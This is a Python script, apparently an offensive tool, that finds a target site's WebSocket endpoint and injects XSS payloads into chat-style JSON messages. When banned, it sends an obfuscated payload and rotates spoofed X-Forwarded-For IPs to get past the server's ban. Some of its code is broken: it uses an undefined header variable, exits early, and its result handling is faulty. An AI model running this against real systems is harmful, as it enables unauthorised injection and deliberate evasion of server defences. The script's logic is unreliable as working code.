#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import argparse
import asyncio
import websockets
import requests
import re
import time
import json

import random
from urllib.parse import urlparse, urljoin


class Colors:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    RESET  = "\033[0m"
    BOLD   = "\033[1m"


USED_IP = set()     # mémorise les IP déjà tentées
TIMEOUT = 3         # adapte si besoin
TIMEOUT = 5


def discover_ws_url(base_url):
    print(f"\n{Colors.BLUE}[*] Fetching page:{Colors.RESET} {Colors.CYAN}{base_url}{Colors.RESET}")

    try:
        r = requests.get(base_url, timeout=5)
    except Exception as e:
        print(f"{Colors.RED}[!] Cannot fetch {base_url}: {e}{Colors.RESET}")
        return None

    html = r.text

    # ---- Direct ws:// or wss:// ----
    matches = re.findall(r'ws[s]?://[^\s"\'<]+', html)
    if matches:
        print(f"{Colors.GREEN}[+] Found WebSocket endpoint:{Colors.RESET} {Colors.CYAN}{matches[0]}{Colors.RESET}")
        return matches[0]

    # ---- WebSocket("...") ----
    matches = re.findall(r'WebSocket\(["\'](.*?)["\']\)', html)
    if matches:
        return build_ws_url(base_url, matches[0])

    # ---- Socket.IO ----
    matches = re.findall(r'io\(["\'](.*?)["\']\)', html)
    if matches:
        return build_ws_url(base_url, matches[0])

    # ---- Fallback ----
    print(f"{Colors.YELLOW}[*] No explicit WS found, guessing...{Colors.RESET}")
    return guess_ws_from_http(base_url)


def build_ws_url(base_url, ws_path):
    parsed = urlparse(base_url)

    if ws_path.startswith("ws"):
        return ws_path

    if parsed.scheme == "https":
        return urljoin(f"wss://{parsed.netloc}", ws_path)
    return urljoin(f"ws://{parsed.netloc}", ws_path)


def guess_ws_from_http(base_url):
    p = urlparse(base_url)
    proto = "wss" if p.scheme == "https" else "ws"
    guess = f"{proto}://{p.netloc}{p.path}"
    print(f"{Colors.CYAN}[+] Best guess WebSocket URL:{Colors.RESET} {Colors.CYAN}{guess}{Colors.RESET}")
    return guess


async def ws_connect(url):
    try:
        return await asyncio.wait_for(
            websockets.connect(url, extra_headers=extra_headers),
            timeout=TIMEOUT
        )
    except Exception as e:
        print(f"{Colors.RED}[!] WS connection error: {e}{Colors.RESET}")

        return None


def generate_random_ip():
    while True:
        ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        if ip not in USED_IP:
            USED_IP.add(ip)
            return ip


def build_headers(ip):
    """Rotate plusieurs styles de headers"""
    header_sets = [
        {"X-Forwarded-For": ip},
        {"X-Real-IP": ip},
        {"Client-IP": ip},
        {"Forwarded": f"for={ip}"},
        {"CF-Connecting-IP": ip},
        {"True-Client-IP": ip},
    ]
    return random.choice(header_sets)


async def ws_connect_with_headers(url, max_retry=10):

    for attempt in range(1, max_retry + 1):
        ip = generate_random_ip()
        headers = {"X-Forwarded-For": f"{ip}"}

        print(f"{Colors.BLUE}[i] Try {attempt}/{max_retry} → IP: {ip} | Headers: {headers}{Colors.RESET}")

        try:
            ws = await asyncio.wait_for(
                websockets.connect(url, extra_headers=headers),
                timeout=TIMEOUT
            )
            print(f"{Colors.GREEN}[+] Connected using IP {ip}{Colors.RESET}")
            return ws

        except Exception as e:
            print(f"{Colors.YELLOW}[!] Connection failed (ip={ip}): {e}{Colors.RESET}")

    print(f"{Colors.RED}[!] All attempts failed — server is blocking you.{Colors.RESET}")
    return None

async def test_xss_injection(url, json_field, max_retry):
    print(f"{Colors.BLUE}[*] Starting XSS test…{Colors.RESET}")

    base_payload = "<img src=0 onerror='alert(123)'>"
    obf_payload  = "<img src=1 oNeRrOr=alert`1`>"

    # 1) FIRST TRY – NORMAL PAYLOAD
    
    msg = json.dumps({json_field: base_payload})
    print(f"{Colors.BLUE}[*] Connecting…{Colors.RESET}")
    
    ws = await ws_connect(url)

    if not ws:
        ws = await ws_connect_with_headers(url, max_retry)
        
        if not ws:
            return False

    try:
        print(f"\n{Colors.BLUE}{Colors.BOLD}-------------------\nStep 1 - Try a simple XSS Injection\n{Colors.RESET}")
        
        print(f"{Colors.BLUE} → Sending payload:{Colors.RESET} {msg}")
        await ws.send(msg)

        # Wait for reply (ban or not)
        try:
            reply = await asyncio.wait_for(ws.recv(), timeout=2)
            print(f"{Colors.CYAN}   ← Received:{Colors.RESET} {reply}")

            print(reply)
            exit()
            return True
        except:
            print(f"{Colors.YELLOW}[*] No response — may indicate ban or silent drop.{Colors.RESET}")

    except websockets.exceptions.ConnectionClosed:
        print(f"{Colors.RED}[!] Connection dropped immediately — likely banned.{Colors.RESET}")
    finally:
        try:
            await ws.close()
        except:
            pass

    # 2) RECONNECT WITH SPOOFED IP
  
    print(f"{Colors.BLUE}[*] Reconnecting with spoofed IP to bypass ban…{Colors.RESET}")

    ws = await ws_connect_with_headers(url, max_retry=max_retry)

    if not ws:
        print(f"{Colors.RED}[!] Could not reconnect with spoofed IP.{Colors.RESET}")
        return False

    # 3) SEND OBFUSCATED PAYLOAD
  
    msg2 = json.dumps({json_field: obf_payload})

    print(f"\n{Colors.BLUE}{Colors.BOLD}-------------------\nStep 2 - Sending obfuscated XSS\n{Colors.RESET}")

    try:
        await ws.send(msg2)
    except Exception as e:
        print(f"{Colors.RED}[!] Error sending obfuscated payload: {e}{Colors.RESET}")
        return False

    # Check if message is reflected
    try:
        for _ in range(20):
            try:
                reply = await asyncio.wait_for(ws.recv(), timeout=0.25)
                print(f"{Colors.CYAN}[CHAT] {reply}{Colors.RESET}")

                if obf_payload in reply:
                    return True

            except asyncio.TimeoutError:
                pass

    except websockets.exceptions.ConnectionClosed:
        print(f"{Colors.RED}! Server closed connection (post-bypass).{Colors.RESET}")

    print(f"{Colors.YELLOW}[*] Obfuscated payload not reflected.{Colors.RESET}")
    return False


async def run_tests(url, json_field, max_retry):
    print(f"\n{Colors.BLUE}=== Running WebSocket tests on:{Colors.RESET} {Colors.CYAN}{url}{Colors.RESET}\n")

    result = await test_xss_injection(url, json_field, max_retry)

    if result:
        print(f"\n{Colors.GREEN}✔ WebSocket XSS vulnerability detected!\n{Colors.RESET}")
    else:
        print(f"{Colors.RED}- No XSS detected.{Colors.RESET}")



def main():
    parser = argparse.ArgumentParser(description="Auto WebSocket Scanner with Ban Bypass")
    parser.add_argument("-t", "--target", help="HTTP/HTTPS page (ex: https://target.com/chat)")
    parser.add_argument("--field", default="message", help="JSON field used for sending messages")
    parser.add_argument("--max_retry", type=int, default=3,
                    help="Maximum retry attempts with new spoofed IPs if banned")

    args = parser.parse_args()

    ws_url = discover_ws_url(args.target)

    if not ws_url:
        print(f"{Colors.RED}[!] No WebSocket discovered — aborting.{Colors.RESET}")
        return

    is_vuln_detected = asyncio.run(run_tests(ws_url, args.field, args.max_retry))

 

if __name__ == "__main__":
    main()
